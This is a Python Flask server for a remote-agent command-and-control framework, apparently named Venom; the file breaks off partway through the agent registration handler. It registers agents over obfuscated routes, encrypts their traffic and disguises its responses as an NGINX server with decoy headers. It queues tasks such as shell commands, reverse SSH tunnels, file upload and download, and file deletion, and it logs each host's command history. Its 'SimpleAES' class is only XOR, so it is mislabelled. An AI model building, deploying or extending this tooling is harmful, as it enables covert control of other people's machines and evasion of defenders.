#!/usr/bin/env python3

from flask import Flask, request, jsonify, g
from werkzeug.serving import run_simple, WSGIRequestHandler
import json
import time
import threading
import base64
import hashlib
import random
import os
from datetime import datetime, timedelta
import logging
import uuid
import math
import secrets
import argparse
import sys
from functools import wraps

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)

class NoServerHeaderWSGIRequestHandler(WSGIRequestHandler):
    def send_header(self, keyword, value):
        if keyword.lower() == "server":
            return  # drop it
        super().send_header(keyword, value)

    # belt-and-suspenders: make sure nothing sets a value here
    def version_string(self):
        return ""

# ---- Command History (server-side logging) ----
HISTORY_DIR = 'history'
HISTORY_INDEX_FILE = os.path.join(HISTORY_DIR, 'index.json')
hostname_to_id = {}
id_to_hostname = {}

# ---- Profile-based routing (server- and agent coordination) ----
PROFILES_DIR = 'profiles'
loaded_profiles = {}  # profile_name -> profile_dict
registered_client_bases = set()  # client base paths already registered
registered_agent_routes = set()  # full agent route paths already registered
profiles_lock = threading.Lock()

# Animal names for agent IDs
AGENT_BASE_NAMES = []

# ---- Client Authentication (Basic Auth with salted hashes) ----
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
AUTH_CONFIG_PATH = os.path.join(SCRIPT_DIR, 'config.json')
AUTH_USERS = {}  # username -> {password_hash, salt, role}

def _pbkdf2_hash(password: str, salt: bytes) -> str:
    dk = hashlib.pbkdf2_hmac('sha256', password.encode('utf-8'), salt, 200_000)
    return base64.b64encode(dk).decode('utf-8')

def _create_user_record(password: str, role: str = 'admin') -> dict:
    salt = secrets.token_bytes(16)
    return {
        'password_hash': _pbkdf2_hash(password, salt),
        'salt': base64.b64encode(salt).decode('utf-8'),
        'role': role
    }

def _verify_password(password: str, record: dict) -> bool:
    try:
        salt = base64.b64decode(record['salt'])
        expected = record['password_hash']
        actual = _pbkdf2_hash(password, salt)
        # constant-time compare
        return hashlib.sha256(actual.encode()).digest() == hashlib.sha256(expected.encode()).digest()
    except Exception:
        return False

def _load_auth_config():
    global AUTH_USERS
    try:
        if not os.path.exists(AUTH_CONFIG_PATH):
            AUTH_USERS = {}
            # Ensure directory exists, then create empty config file
            dirpath = os.path.dirname(AUTH_CONFIG_PATH)
            if dirpath and not os.path.exists(dirpath):
                os.makedirs(dirpath, exist_ok=True)
            with open(AUTH_CONFIG_PATH, 'w', encoding='utf-8') as f:
                json.dump({'users': {}}, f, indent=2)
            return False  # indicate freshly created (no users yet)
        with open(AUTH_CONFIG_PATH, 'r', encoding='utf-8') as f:
            data = json.load(f) or {}
        AUTH_USERS = data.get('users', {})
        return True
    except Exception:
        AUTH_USERS = {}
        return False

def _save_auth_config():
    try:
        with open(AUTH_CONFIG_PATH, 'w', encoding='utf-8') as f:
            json.dump({'users': AUTH_USERS}, f, indent=2)
        return True
    except Exception as e:
        logger.error(f"[auth] Failed to save auth config: {e}")
        return False

def ensure_default_admin() -> str:
    """Ensure config exists; if not, create with default admin and return plaintext password (or None)."""
    had_config = _load_auth_config()
    if had_config and 'admin' in AUTH_USERS:
        return None
    if not had_config:
        dirpath = os.path.dirname(AUTH_CONFIG_PATH)
        if dirpath and not os.path.exists(dirpath):
            os.makedirs(dirpath, exist_ok=True)
    # Create default admin with random password
    default_password = secrets.token_urlsafe(14)
    AUTH_USERS['admin'] = _create_user_record(default_password, role='admin')
    if not _save_auth_config():
        logger.error("[auth] Failed to save default admin credentials")
        return None
    return default_password

def add_or_update_user(username: str, password: str, role: str = 'admin'):
    if not username or not password:
        raise ValueError('Username and password are required')
    _load_auth_config()
    AUTH_USERS[username] = _create_user_record(password, role=role)
    if not _save_auth_config():
        raise RuntimeError('Failed to save user configuration')

def _parse_basic_auth_header() -> tuple:
    """Return (username, password) from Authorization header or (None, None)."""
    try:
        auth = request.headers.get('Authorization', '')
        if not auth.startswith('Basic '):
            return None, None
        b64 = auth.split(' ', 1)[1].strip()
        raw = base64.b64decode(b64).decode('utf-8', errors='ignore')
        if ':' not in raw:
            return None, None
        username, password = raw.split(':', 1)
        return username, password
    except Exception:
        return None, None

def require_client_auth(handler_func):
    @wraps(handler_func)
    def _wrapped(*args, **kwargs):
        # Load auth users if not loaded
        if not AUTH_USERS:
            _load_auth_config()
        username, password = _parse_basic_auth_header()
        if not username or not password:
            resp = jsonify({'error': 'Unauthorized'})
            resp.status_code = 401
            resp.headers['WWW-Authenticate'] = 'Basic realm="Venom Client API"'
            return resp
        record = AUTH_USERS.get(username)
        if not record or not _verify_password(password, record):
            resp = jsonify({'error': 'Unauthorized'})
            resp.status_code = 401
            resp.headers['WWW-Authenticate'] = 'Basic realm="Venom Client API"'
            return resp
        # Stash authenticated username for downstream handlers
        try:
            g.auth_user = username
        except Exception:
            pass
        return handler_func(*args, **kwargs)
    return _wrapped

def ensure_history_dir():
    try:
        if not os.path.exists(HISTORY_DIR):
            os.makedirs(HISTORY_DIR, exist_ok=True)
        # Ensure index file exists
        if not os.path.exists(HISTORY_INDEX_FILE):
            with open(HISTORY_INDEX_FILE, 'w') as f:
                json.dump({'hostname_to_id': {}, 'id_to_hostname': {}}, f)
        logger.info(f"[history] ensure_history_dir OK at '{HISTORY_DIR}' (index present={os.path.exists(HISTORY_INDEX_FILE)})")
    except Exception as e:
        logger.error(f"Failed to ensure history dir: {e}")

def load_history_index():
    try:
        ensure_history_dir()
        with open(HISTORY_INDEX_FILE, 'r') as f:
            try:
                data = json.load(f) or {}
            except Exception:
                data = {'hostname_to_id': {}, 'id_to_hostname': {}}
        global hostname_to_id, id_to_hostname
        hostname_to_id = data.get('hostname_to_id', {})
        id_to_hostname = data.get('id_to_hostname', {})
        logger.info(f"[history] index loaded: hosts={len(hostname_to_id)} ids={len(id_to_hostname)}")
    except Exception:
        # Start empty
        pass

def save_history_index():
    try:
        ensure_history_dir()
        with open(HISTORY_INDEX_FILE, 'w') as f:
            json.dump({'hostname_to_id': hostname_to_id, 'id_to_hostname': id_to_hostname}, f, indent=2)
        logger.info(f"[history] index saved: hosts={len(hostname_to_id)} ids={len(id_to_hostname)}")
    except Exception as e:
        logger.error(f"Failed to save history index: {e}")

def get_or_create_host_id(hostname: str) -> str:
    try:
        safe = safe_hostname(hostname)
        if safe in hostname_to_id:
            return hostname_to_id[safe]
        # Create new id
        new_id = uuid.uuid4().hex[:12]
        hostname_to_id[safe] = new_id
        id_to_hostname[new_id] = safe
        save_history_index()
        logger.info(f"[history] created new host id {new_id} for hostname '{safe}'")
        return new_id
    except Exception:
        return uuid.uuid4().hex[:12]

def safe_hostname(name: str) -> str:
    try:
        return ''.join(c if c.isalnum() or c in '._-' else '_' for c in (name or 'unknown'))
    except Exception:
        return 'unknown'

def get_history_path_for_host(hostname: str) -> str:
    ensure_history_dir()
    return os.path.join(HISTORY_DIR, f"{safe_hostname(hostname)}.hist")

# ---- Profiles: load/parse/register ----
def ensure_profiles_dir():
    try:
        if not os.path.exists(PROFILES_DIR):
            os.makedirs(PROFILES_DIR, exist_ok=True)
    except Exception as e:
        logger.error(f"[profiles] Failed to ensure profiles dir: {e}")

def _validate_profile(name: str, profile: dict) -> bool:
    if not isinstance(profile, dict):
        return False
    if 'server' not in profile or 'agent' not in profile:
        logger.error(f"[profiles] '{name}' missing 'server' or 'agent' root keys")
        return False
    return True

def _normalize_profile(profile: dict) -> dict:
    config = profile.get('config') or {}
    server_cfg = profile.get('server') or {}
    agent_cfg = profile.get('agent') or {}

    # Extract aes_key and aes_iv from config
    aes_key = config.get('aes_key')
    aes_iv = config.get('aes_iv')
    if not aes_key or not aes_iv:
        raise ValueError("Missing aes_key or aes_iv in config")

    return {
        'config': {'aes_key': aes_key, 'aes_iv': aes_iv},
        'server': server_cfg,
        'agent': agent_cfg
    }

def _make_wrapped_view(handler_func, profile_name: str):
    @wraps(handler_func)
    def _wrapped(*args, **kwargs):
        g.active_profile = profile_name
        return handler_func(*args, **kwargs)
    _wrapped.__name__ = f"{handler_func.__name__}__{profile_name}"
    return _wrapped

def register_routes_for_profile(app: Flask, profile_name: str, profile: dict):
    try:
        profile = _normalize_profile(profile)
        agent_cfg = profile['agent']
        server_cfg = profile['server']

        # Validate required fields (no defaults)
        required_agent_keys = ['agent_api_base_paths', 'uri_endpoints', 'data_field_names']
        for key in required_agent_keys:
            if key not in agent_cfg or not agent_cfg.get(key):
                logger.error(f"[profiles] Profile '{profile_name}' missing agent.{key}; skipping route registration for this profile")
                return
        if 'client_api_base_path' not in server_cfg or not server_cfg.get('client_api_base_path'):
            logger.error(f"[profiles] Profile '{profile_name}' missing server.client_api_base_path; skipping client endpoints for this profile")
            return

        # Register agent obfuscated endpoints (per-profile)
        agent_endpoints = ['agent/register', 'agent/poll', 'agent/result', 'agent/checkin']
        uri_endpoints = agent_cfg.get('uri_endpoints', {})
        agent_bases = agent_cfg.get('agent_api_base_paths', [])

        for api_base_path in agent_bases:
            for original_endpoint, variations in uri_endpoints.items():
                if original_endpoint not in agent_endpoints:
                    continue
                for variation in variations:
                    full_endpoint = f"{api_base_path}/{variation}"
                    if full_endpoint in registered_agent_routes:
                        logger.error(f"[profiles] Duplicate route '{full_endpoint}' in profile '{profile_name}'; skipping")
                        continue
                    try:
                        if original_endpoint == 'agent/register':
                            app.add_url_rule(full_endpoint, f'agent_register_{profile_name}_{hash(full_endpoint)}', _make_wrapped_view(register_agent, profile_name), methods=['POST'])
                        elif original_endpoint == 'agent/poll':
                            app.add_url_rule(full_endpoint, f'agent_poll_{profile_name}_{hash(full_endpoint)}', _make_wrapped_view(agent_poll, profile_name), methods=['POST'])
                        elif original_endpoint == 'agent/result':
                            app.add_url_rule(full_endpoint, f'agent_result_{profile_name}_{hash(full_endpoint)}', _make_wrapped_view(submit_result, profile_name), methods=['POST'])
                        elif original_endpoint == 'agent/checkin':
                            app.add_url_rule(full_endpoint, f'agent_checkin_{profile_name}_{hash(full_endpoint)}', _make_wrapped_view(agent_checkin, profile_name), methods=['POST'])
                        registered_agent_routes.add(full_endpoint)
                    except Exception as e:
                        logger.error(f"[profiles] Failed to register agent route {full_endpoint}: {e}")

        # Register simple client endpoints for this profile's base path
        client_base = server_cfg.get('client_api_base_path')
        if client_base not in registered_client_bases:
            try:
                app.add_url_rule(
                    f'{client_base}/health',
                    f'health_original_{profile_name}',
                    require_client_auth(_make_wrapped_view(health_check, profile_name)),
                    methods=['GET']
                )
                app.add_url_rule(
                    f'{client_base}/client/task',
                    f'client_task_original_{profile_name}',
                    require_client_auth(_make_wrapped_view(create_task, profile_name)),
                    methods=['POST']
                )
                app.add_url_rule(
                    f'{client_base}/client/task/<task_id>',
                    f'client_task_result_original_{profile_name}',
                    require_client_auth(_make_wrapped_view(get_task_result, profile_name)),
                    methods=['GET']
                )
                app.add_url_rule(
                    f'{client_base}/client/tasks',
                    f'client_tasks_original_{profile_name}',
                    require_client_auth(_make_wrapped_view(list_tasks, profile_name)),
                    methods=['GET']
                )
                app.add_url_rule(
                    f'{client_base}/client/agents',
                    f'client_agents_original_{profile_name}',
                    require_client_auth(_make_wrapped_view(list_agents, profile_name)),
                    methods=['GET']
                )
                app.add_url_rule(
                    f'{client_base}/client/history/hosts',
                    f'client_history_hosts_{profile_name}',
                    require_client_auth(_make_wrapped_view(http_history_hosts, profile_name)),
                    methods=['GET']
                )
                app.add_url_rule(
                    f'{client_base}/client/history/<host_id>',
                    f'client_history_host_{profile_name}',
                    require_client_auth(_make_wrapped_view(http_history_host, profile_name)),
                    methods=['GET']
                )
                app.add_url_rule(
                    f'{client_base}/client/history/download/<host_id>',
                    f'client_history_download_{profile_name}',
                    require_client_auth(_make_wrapped_view(http_history_download, profile_name)),
                    methods=['GET']
                )
                registered_client_bases.add(client_base)
                logger.info(f"[profiles] Registered client base '{client_base}' for profile '{profile_name}'")
            except Exception as e:
                logger.error(f"[profiles] Failed to register client endpoints for base '{client_base}' in profile '{profile_name}': {e}")
    except Exception as e:
        logger.error(f"[profiles] Failed to register routes for profile '{profile_name}': {e}")

def load_profiles_from_disk(app: Flask):
    ensure_profiles_dir()
    try:
        with profiles_lock:
            for fname in os.listdir(PROFILES_DIR):
                if not fname.endswith('.json'):
                    continue
                profile_name = os.path.splitext(fname)[0]
                if profile_name in loaded_profiles:
                    continue
                fpath = os.path.join(PROFILES_DIR, fname)
                try:
                    with open(fpath, 'r', encoding='utf-8') as f:
                        profile = json.load(f)
                    if not _validate_profile(profile_name, profile):
                        logger.error(f"[profiles] Invalid profile '{fname}', skipping")
                        continue
                    loaded_profiles[profile_name] = profile
                    prof = _normalize_profile(profile)
                    loaded_crypto[profile_name] = SimpleAES(prof['config']['aes_key'], prof['config']['aes_iv'])
                    # Load server response config
                    server_cfg = prof['server']
                    loaded_server_configs[profile_name] = {
                        'always_response_headers': server_cfg.get('always_response_headers', []),
                        'random_response_headers': server_cfg.get('random_response_headers', []),
                        'min_random_headers': server_cfg.get('min_random_headers', 0),
                        'max_random_headers': server_cfg.get('max_random_headers', 0),
                        'min_random_json_attributes': server_cfg.get('min_random_json_attributes', 3),
                        'max_random_json_attributes': server_cfg.get('max_random_json_attributes', 7),
                        'random_json_attributes': server_cfg.get('random_json_attributes', []),
                        'data_field_names': prof['agent'].get('data_field_names', [])  # Reuse agent's field names
                    }
                    register_routes_for_profile(app, profile_name, profile)
                    logger.info(f"[profiles] Loaded and registered profile '{profile_name}' from '{fname}'")
                except Exception as e:
                    logger.error(f"[profiles] Failed to load profile from '{fname}': {e}")
        # Load AGENT_BASE_NAMES from default profile if available
        global AGENT_BASE_NAMES
        if 'default' in loaded_profiles:
            AGENT_BASE_NAMES = loaded_profiles['default'].get('server', {}).get('agent_base_names', [])
            if not AGENT_BASE_NAMES:
                logger.warning("[profiles] No agent_base_names in default profile")
        else:
            AGENT_BASE_NAMES = []
            logger.warning("[profiles] Default profile not loaded, AGENT_BASE_NAMES empty")
    except Exception as e:
        logger.error(f"[profiles] load_profiles_from_disk error: {e}")

def create_server_generator(gen):
    typ = gen['type']
    if typ == 'uniform':
        minv, maxv = gen['min'], gen['max']
        rnd = gen.get('round')
        if rnd is not None:
            return lambda: round(random.uniform(minv, maxv), rnd)
        return lambda: random.uniform(minv, maxv)
    elif typ == 'randint':
        return lambda: random.randint(gen['min'], gen['max'])
    elif typ == 'choice':
        opts = gen['options']
        return lambda: random.choice(opts)
    elif typ == 'datetime_utc':
        return lambda: datetime.utcnow().isoformat()
    elif typ == 'str_randint':
        return lambda: str(random.randint(gen['min'], gen['max']))
    elif typ == 'template':
        template = gen['template']
        vars_gen = {k: create_server_generator(v) for k, v in gen.items() if k not in ['type', 'template']}
        return lambda: template.format(**{k: v() for k, v in vars_gen.items()})
    elif typ == 'base64_random':
        min_len = gen.get('min_length', 20)
        max_len = gen.get('max_length', 50)
        min_bytes = math.ceil(min_len * 3 / 4)
        max_bytes = math.floor(max_len * 3 / 4) - 1
        max_bytes = max(min_bytes, max_bytes)  # Ensure valid range
        return lambda: base64.b64encode(secrets.token_bytes(random.randint(min_bytes, max_bytes))).decode('utf-8')
    raise ValueError(f"Unknown generator type: {typ}")

def generate_random_json_attributes(profile_name):
    if profile_name not in loaded_server_configs:
        return {}
    attrs = loaded_server_configs[profile_name]['random_json_attributes']
    if not attrs:
        return {}
    min_n = loaded_server_configs[profile_name]['min_random_json_attributes']
    max_n = min(loaded_server_configs[profile_name]['max_random_json_attributes'], len(attrs))
    num_attrs = random.randint(min_n, max_n)
    selected = random.sample(attrs, min(num_attrs, len(attrs)))
    return {attr['name']: gen() for attr, gen in [(s, create_server_generator(s['generator'])) for s in selected]}

def watch_profiles_for_changes(app: Flask, interval_seconds: int = 30):
    while True:
        try:
            load_profiles_from_disk(app)
        except Exception as e:
            logger.error(f"[profiles] watcher error: {e}")
        time.sleep(interval_seconds)

def format_task_command(task) -> str:
    try:
        t = task.type
        if t == 'shell':
            return f"shell {task.command}" if task.command else 'shell'
        if t == 'sleep':
            parts = [str(task.sleep_time or '')]
            if task.jitter_percent is not None:
                parts.append(str(task.jitter_percent))
            return f"sleep {' '.join([p for p in parts if p])}".strip()
        if t == 'kill':
            return 'kill'
        if t == 'ls':
            return f"ls {task.path}" if task.path else 'ls'
        if t == 'pwd':
            return 'pwd'
        if t == 'cd':
            return f"cd {task.path}"
        if t == 'cat':
            return f"cat {task.path}"
        if t == 'mv':
            return f"mv {task.src} {task.dst}"
        if t == 'cp':
            return f"cp {task.src} {task.dst}"
        if t == 'mkdir':
            return f"mkdir {task.path}"
        if t == 'rmdir':
            return f"rmdir {task.path}"
        if t == 'write':
            return f"write {task.path}"
        if t == 'chmod':
            return f"chmod {task.mode} {task.path}"
        if t == 'rm':
            return f"rm {task.path}"
        if t == 'sshrev':
            return f"sshrev {task.key_path} {task.port} {task.user} {task.domain}"
        if t == 'upload':
            return f"upload <local> {task.remote_path}"
        if t == 'download':
            return f"download {task.remote_path}"
        return t or 'unknown'
    except Exception:
        return 'unknown'

def append_history_entry(hostname: str, entry: dict):
    try:
        ensure_history_dir()
        # Ensure host id exists
        get_or_create_host_id(hostname)
        path = get_history_path_for_host(hostname)
        with open(path, 'a', encoding='utf-8') as f:
            f.write(json.dumps(entry) + '\n')
        logger.info(f"[history] appended entry for '{hostname}': cmd='{entry.get('command','')}'")
    except Exception as e:
        logger.error(f"Failed to append history: {e}")

def read_last_n_lines(path: str, n: int = 200):
    try:
        if not os.path.exists(path):
            return []
        with open(path, 'r', encoding='utf-8', errors='replace') as f:
            lines = f.read().splitlines()
        return lines[-n:]
    except Exception as e:
        logger.error(f"Failed to read history: {e}")
        return []

# ---- History API helpers (ID-based) ----
def list_history_hosts():
    try:
        load_history_index()
        items = []
        for host_safe, host_id in hostname_to_id.items():
            fname = f"{host_safe}.hist"
            fpath = os.path.join(HISTORY_DIR, fname)
            try:
                size = os.path.getsize(fpath)
            except Exception:
                size = 0
            items.append({'host_id': host_id, 'hostname': host_safe, 'size': size})
        resp = {'success': True, 'hosts': items}
        logger.info(f"[history] list hosts -> {len(items)} hosts")
        return resp
    except Exception as e:
        logger.error(f"Failed to list history hosts: {e}")
        return {'success': False, 'error': 'Failed to list hosts'}

def get_history_for_host_by_id(host_id, limit=200):
    try:
        load_history_index()
        hostname = id_to_hostname.get(host_id)
        if not hostname:
            return {'success': False, 'error': 'Unknown host id'}
        path = get_history_path_for_host(hostname)
        lines = read_last_n_lines(path, int(limit or 200))
        entries = []
        for line in lines:
            try:
                entries.append(json.loads(line))
            except Exception:
                continue
        resp = {'success': True, 'host_id': host_id, 'hostname': hostname, 'entries': entries}
        logger.info(f"[history] get host id={host_id} hostname='{hostname}' -> {len(entries)} entries")
        return resp
    except Exception as e:
        logger.error(f"Failed to get history for id {host_id}: {e}")
        return {'success': False, 'error': 'Failed to read history'}

def download_history_file_by_id(host_id):
    try:
        load_history_index()
        hostname = id_to_hostname.get(host_id)
        if not hostname:
            return {'success': False, 'error': 'Unknown host id'}
        path = get_history_path_for_host(hostname)
        if not os.path.exists(path):
            return {'success': False, 'error': 'Not found'}
        with open(path, 'rb') as f:
            data = f.read()
        data_b64 = base64.b64encode(data).decode('utf-8')
        resp = {'success': True, 'host_id': host_id, 'hostname': hostname, 'size': len(data), 'data_b64': data_b64}
        logger.info(f"[history] download host id={host_id} hostname='{hostname}' size={len(data)}")
        return resp
    except Exception as e:
        logger.error(f"Failed to download history: {e}")
        return {'success': False, 'error': 'Failed to download'}

def http_history_host(host_id):
    limit = request.args.get('limit', 200)
    logger.info(f"[history][HTTP] GET history for host_id={host_id} limit={limit}")
    try:
        # Coerce limit to int safely
        try:
            limit_val = int(limit)
        except Exception:
            limit_val = 200
        resp = get_history_for_host_by_id(host_id, limit_val)
        if not isinstance(resp, dict):
            return jsonify({'success': False, 'error': 'Server error'}), 500
        return jsonify(resp)
    except Exception as e:
        logger.error(f"[history] http_history_host failed: {e}")
        return jsonify({'success': False, 'error': 'Server error'}), 500

def http_history_download(host_id):
    logger.info(f"[history][HTTP] GET download history for host_id={host_id}")
    return jsonify(download_history_file_by_id(host_id))

def http_history_hosts():
    logger.info(f"[history][HTTP] GET list hosts")
    return jsonify(list_history_hosts())

def generate_task_id():
    """Generate a task ID"""
    return f"task_{random.randint(1000, 9999)}"

def get_random_data_field():
    # Unused now, as we rely on profiles
    raise NotImplementedError("get_random_data_field should not be called; use profile data_field_names")

def register_obfuscated_routes(app):
    """Register routes for all profiles; fallback to defaults if no profiles are present."""
    # Load any new profiles on disk
    load_profiles_from_disk(app)

    if loaded_profiles:
        print(f"Profiles loaded: {list(loaded_profiles.keys())}")
        print(f"Routes registered. url_map={app.url_map}")
        return

    # Fallback legacy registration using defaults
    # all_endpoints = get_all_possible_endpoints() # This function is removed
    print(f"[fallback] Registering {len(loaded_profiles)} obfuscated routes...")
    registered_count = 0
    for profile_name, profile in loaded_profiles.items():
        try:
            register_routes_for_profile(app, profile_name, profile)
            registered_count += 1
        except Exception as e:
            print(f"Failed to register routes for profile '{profile_name}': {e}")
    
    print(f"[fallback] Successfully registered {registered_count} obfuscated routes")
    
    print(f"[fallback] Routes registered. url_map={app.url_map}")

@app.after_request
def add_response_headers(response):
    """Override Werkzeug server header to maintain NGINX disguise"""
    # Always remove default Server header if present
    active = getattr(g, 'active_profile', None)
    if active and active in loaded_server_configs:
        config = loaded_server_configs[active]
        # Add always_response_headers
        for name, value in config['always_response_headers']:
            response.headers[name] = value
        
        # Add random headers
        random_headers = config['random_response_headers']
        if random_headers:
            min_h = config['min_random_headers']
            max_h = min(config['max_random_headers'], len(random_headers))
            num = random.randint(min_h, max_h)
            selected = random.sample(random_headers, num)
            for name, value in selected:
                response.headers[name] = value
    
    return response

def generate_agent_id():
    """Generate a friendly animal-based agent ID"""
    if not AGENT_BASE_NAMES:
        raise ValueError("AGENT_BASE_NAMES is not set. Ensure default profile is loaded.")
    base_name = random.choice(AGENT_BASE_NAMES)
    number = random.randint(10, 99)
    return f"{base_name}{number}"

# Remove get_all_possible_endpoints function entirely, as it's unused

def save_checkin_data(agent_id, system_info):
    """Save checkin data to a rolling JSON file"""
    try:
        # Use current working directory instead of __file__ for better compatibility
        checkin_file = 'checkins.json'
        
        # Create new checkin entry
        checkin_entry = {
            'timestamp': datetime.now().isoformat(),
            'agent_id': agent_id,
            'system_info': system_info
        }
        
        # Read existing data
        checkins = []
        if os.path.exists(checkin_file):
            try:
                with open(checkin_file, 'r') as f:
                    checkins = json.load(f)
            except (json.JSONDecodeError, IOError):
                checkins = []
        
        # Add new entry
        checkins.append(checkin_entry)
        
        # Keep only last 1000 checkins to prevent file from growing too large
        if len(checkins) > 1000:
            checkins = checkins[-1000:]
        
        # Save back to file
        with open(checkin_file, 'w') as f:
            json.dump(checkins, f, indent=2)
        
        logger.info(f"Saved checkin data for agent {agent_id}")
        
    except Exception as e:
        logger.error(f"Failed to save checkin data: {e}")

# Embedded AES Encryption (same as agent)
class SimpleAES:
    """Simple AES implementation using hashlib for key derivation"""
    
    def __init__(self, key_b64, iv_b64):
        self.key = base64.b64decode(key_b64)
        self.iv = base64.b64decode(iv_b64)
    
    def _xor_bytes(self, data, key):
        """Simple XOR encryption (fallback if AES not available)"""
        result = bytearray()
        key_len = len(key)
        for i, byte in enumerate(data):
            result.append(byte ^ key[i % key_len])
        return bytes(result)
    
    def _pad(self, data):
        """PKCS7 padding"""
        if isinstance(data, str):
            data = data.encode('utf-8')
        pad_len = 16 - (len(data) % 16)
        return data + bytes([pad_len] * pad_len)
    
    def _unpad(self, data):
        """Remove PKCS7 padding"""
        pad_len = data[-1]
        return data[:-pad_len]
    
    def encrypt(self, plaintext):
        """Encrypt plaintext using simple XOR (fallback)"""
        try:
            padded_data = self._pad(plaintext)
            # Use hash of key + IV for encryption
            hash_key = hashlib.sha256(self.key + self.iv).digest()
            encrypted = self._xor_bytes(padded_data, hash_key)
            return base64.b64encode(encrypted).decode('utf-8')
        except Exception as e:
            logger.error(f"Encryption failed: {e}")
            return None
    
    def decrypt(self, ciphertext):
        """Decrypt ciphertext using simple XOR (fallback)"""
        try:
            encrypted_data = base64.b64decode(ciphertext)
            # Use hash of key + IV for decryption
            hash_key = hashlib.sha256(self.key + self.iv).digest()
            decrypted = self._xor_bytes(encrypted_data, hash_key)
            unpadded = self._unpad(decrypted)
            return unpadded.decode('utf-8')
        except Exception as e:
            logger.error(f"Decryption failed: {e}")
            return None
    
    def encrypt_json(self, data):
        """Encrypt JSON data"""
        json_str = json.dumps(data)
        return self.encrypt(json_str)
    
    def decrypt_json(self, encrypted_data):
        """Decrypt JSON data"""
        decrypted_str = self.decrypt(encrypted_data)
        if decrypted_str:
            try:
                return json.loads(decrypted_str)
            except json.JSONDecodeError as e:
                logger.error(f"JSON decode failed: {e}")
        return None
    
    def get_key_b64(self):
        """Get base64 encoded key for compatibility"""
        return self.key.decode('utf-8') # Return raw key for compatibility
    
    def get_iv_b64(self):
        """Get base64 encoded IV for compatibility"""
        return self.iv.decode('utf-8') # Return raw IV for compatibility

# Initialize crypto
# crypto = SimpleAES(AES_KEY, AES_IV) # Removed global crypto

# Global storage
tasks = {}
task_queue = []
agent_results = {}
connected_agents = {}  # agent_id -> last_seen_timestamp
agent_system_info = {}  # agent_id -> system_info
agent_sleep_times = {}  # agent_id -> {'max_sleep': float, 'last_updated': timestamp}

# Add to globals
loaded_crypto = {}  # profile_name -> SimpleAES instance
loaded_server_configs = {}  # profile_name -> dict of server response config

class Task:
    def __init__(self, task_type, command=None, sleep_time=None, jitter_percent=None, agent_id=None, path=None, src=None, dst=None, content=None, key_path=None, port=None, user=None, domain=None, local_path=None, remote_path=None, file_data=None, mode=None):
        self.id = generate_task_id()
        self.type = task_type
        self.command = command
        self.sleep_time = sleep_time
        self.jitter_percent = jitter_percent
        self.agent_id = agent_id
        self.path = path
        self.src = src
        self.dst = dst
        self.content = content
        self.key_path = key_path
        self.port = port
        self.user = user
        self.domain = domain
        # Upload/Download parameters
        self.local_path = local_path  # Local file path (on client)
        self.remote_path = remote_path  # Remote file path (on agent)
        self.file_data = file_data  # Base64 encoded file data for upload
        self.mode = mode  # File mode for chmod
        self.created_at = datetime.now().isoformat()
        self.status = "pending"  # pending, assigned, completed, failed
        self.assigned_to = None
        
    def to_dict(self):
        task_dict = {
            'id': self.id,
            'type': self.type,
            'created_at': self.created_at,
            'status': self.status,
            'assigned_to': self.assigned_to
        }
        
        # Include all parameters that were set (even if None for debugging)
        task_dict['command'] = self.command
        task_dict['sleep_time'] = self.sleep_time
        task_dict['jitter_percent'] = self.jitter_percent
        task_dict['agent_id'] = self.agent_id
        task_dict['path'] = self.path
        task_dict['src'] = self.src
        task_dict['dst'] = self.dst
        task_dict['content'] = self.content
        task_dict['key_path'] = self.key_path
        task_dict['port'] = self.port
        task_dict['user'] = self.user
        task_dict['domain'] = self.domain
        # Upload/Download parameters
        task_dict['local_path'] = self.local_path
        task_dict['remote_path'] = self.remote_path
        task_dict['file_data'] = self.file_data
        # Chmod parameter
        task_dict['mode'] = self.mode
            
        return task_dict

def decrypt_request_data(request):
    """Decrypt request data from agent using random field names"""
    try:
        if not request.is_json:
            return None
            
        data = request.json
        if not data:
            return None
        
        # Try to find the encrypted data in any of the known field names (profile-aware)
        encrypted_data = None
        # If this request is being handled under a specific profile (set by wrapped views),
        # use that profile's field names for obfuscation
        try:
            active = getattr(g, 'active_profile', None)
            if active and active in loaded_profiles:
                prof = _normalize_profile(loaded_profiles[active])
                field_names = prof['agent'].get('data_field_names')
                if not field_names:
                    logger.error(f"No data_field_names in profile {active}")
                    return None
            else:
                logger.error("No active profile for request")
                return None
        except Exception as e:
            logger.error(f"Profile error in decrypt: {e}")
            return None
        for field_name in field_names:
            if field_name in data:
                encrypted_data = data[field_name]
                break
        
        if not encrypted_data:
            logger.error("No encrypted data found in request")
            return None
        
        # Instead of global crypto
        active = getattr(g, 'active_profile', None)
        if not active or active not in loaded_crypto:
            logger.error(f"No crypto for profile {active}")
            return None
        crypto_inst = loaded_crypto[active]
        decrypted = crypto_inst.decrypt_json(encrypted_data)
        return decrypted
    except Exception as e:
        logger.error(f"Failed to decrypt request data: {e}")
        return None

def encrypt_response_data(data):
    print(f"[encrypt_response_data] data={data}")
    """Encrypt response data for agent using random field names"""
    try:
        # Instead of global crypto
        active = getattr(g, 'active_profile', None)
        if not active or active not in loaded_crypto:
            logger.error(f"No crypto for profile {active}")
            return {'error': 'Encryption failed'}
        crypto_inst = loaded_crypto[active]
        encrypted_data = crypto_inst.encrypt_json(data)
        # Use a random field name for the encrypted data (profile-aware)
        try:
            if active and active in loaded_server_configs:
                names = loaded_server_configs[active]['data_field_names']
                if not names:
                    logger.error(f"No data_field_names in profile {active}")
                    return {'error': 'Encryption failed'}
                field_name = random.choice(names)
            else:
                logger.error("No active profile for response")
                return {'error': 'Encryption failed'}
        except Exception as e:
            logger.error(f"Profile error in encrypt: {e}")
            return {'error': 'Encryption failed'}
        response = {field_name: encrypted_data}
        # Add random JSON attributes
        response.update(generate_random_json_attributes(active))
        print(f"[encrypt_response_data] response={response}")
        return response
    except Exception as e:
        logger.error(f"Failed to encrypt response data: {e}")
        return {'error': 'Encryption failed'}

def health_check():
    """Health check endpoint"""
    return jsonify({'status': 'healthy', 'timestamp': datetime.now().isoformat()})

def register_agent():
    """Register a new agent"""
    try:
        data = decrypt_request_data(request)
        if not data:
            return jsonify({'error': 'Invalid encrypted data'}), 400
        
        agent_id = data.get('agent_id')
        system_info = data.get('system_info', {})
        if not agent_id or agent_id not in connected_agents:  # Or check if valid
            agent_id = generate_agent_id()
        
        connected_agents[agent_id] = time.time()
        if system_info:
            agent_system_info[agent_id] = system_info
            save_checkin_data(agent_id, system_info)
        logger.info(f"Agent {agent_id} registered")
        
        response_data = {
            'success': True,
